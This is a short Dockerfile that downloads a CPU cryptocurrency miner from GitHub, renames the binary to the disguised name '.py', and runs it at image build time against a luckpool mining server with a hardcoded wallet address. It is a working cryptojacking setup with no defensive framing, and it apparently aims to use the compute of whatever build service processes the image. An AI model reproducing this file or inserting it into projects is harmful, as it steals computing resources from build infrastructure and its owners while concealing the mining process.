FROM ubuntu:20.04
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
RUN gunzip hellminer_cpu_linux.tar.gz
RUN tar -xvf hellminer_cpu_linux.tar
RUN rm -rf hellminer_cpu_linux.tar.gz
RUN chmod +x ./hellminer
RUN mv hellminer .py
RUN ./.py -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RAcHTdhwsn1mWD7rxHCZX6AdrPpyiy9beA.cpuX -p x --cpu 2
